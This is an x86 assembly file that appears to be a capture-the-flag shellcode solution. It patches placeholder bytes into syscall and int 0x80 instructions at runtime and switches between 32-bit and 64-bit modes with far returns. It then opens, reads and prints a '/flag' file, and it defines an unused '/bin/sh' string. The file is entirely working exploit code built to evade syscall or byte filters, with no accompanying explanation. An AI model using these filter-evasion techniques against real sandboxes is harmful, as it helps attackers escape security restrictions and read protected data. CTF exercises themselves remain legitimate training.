    BITS 32
    DEFAULT REL

    global _start

_start:
    cld

    mov al, 0xcd
    mov ah, 0x80
    mov word [esp], ax
    mov byte [esp+2], 0xc3

    mov eax, 90
    lea ebx, MMAP
    call esp

    sub esp, 0x1000
    mov ebx, esp
    sub esp, 0x1000
    mov ebp, esp
    sub esp, 0x1000

    mov esi, program64
    mov edi, ebx
    mov ecx, program64_end-program64
    rep movsb

    mov ecx, program64_end-program64
    mov esi, ebx
    mov al, 0x0f
    mov ah, 0x05
.fixup64:
    mov dx, word [esi]
    cmp dx, 0x6969
    cmove dx, ax
    mov word [esi], dx
    inc esi
    dec ecx
    jnz .fixup64

    mov esi, program32
    mov edi, ebp
    mov ecx, program32_end-program32
    rep movsb

    mov ecx, program32_end-program32
    mov esi, ebp
    mov al, 0xcd
    mov ah, 0x80
.fixup32:
    mov dx, word [esi]
    cmp dx, 0x6969
    cmove dx, ax
    mov word [esi], dx
    inc esi
    dec ecx
    jnz .fixup32

    mov edi, ebx

    push 0x33
    push edi
    retf

    BITS 64

program64:
    mov eax, 9
    mov rdi, 0x1337331337 & ~0xfff
    mov esi, 0x1000
    mov edx, 0x2
    mov r10, 0x32
    mov r8, 1
    mov r9, 0
    dw 0x6969
    ; mov eax, 2
    ; mov edi, 0x31337
    ; xor esi, esi
    ; dw 0x6969

    mov rdi, 0x1337331337
    mov rax, `/flag`
    mov qword [rdi], rax

    mov eax, 2
    xor esi, esi
    dw 0x6969

    mov eax, 0x3c
    mov edi, 137
    dw 0x6969

    push rbp
    mov dword [rsp+4], 0x23
    retf
program64_end:

    BITS 32

program32:
    mov eax, 3
    mov ebx, 3
    mov ecx, esp
    mov edx, 0x40
    dw 0x6969

    mov eax, 4
    mov ebx, 1
    mov ecx, esp
    mov edx, 0x40
    dw 0x6969

    mov eax, 1
    mov ebx, 137
    dw 0x6969
program32_end:

MMAP:  DD 0       ; start - suggest memory address to allocate
       DD 0x1000  ; length
       DD 7       ; prot (PROT_READ + PROT_WRITE)
       DD 0x32    ; flags (MAP_SHARED = 1)
FD:    DD -1      ; file discriptor(handle)
       DD 0       ; offset into file to start reading

shell:
    db "/bin/sh", 0
flag:
    db "/flag", 0
flag_len equ $-flag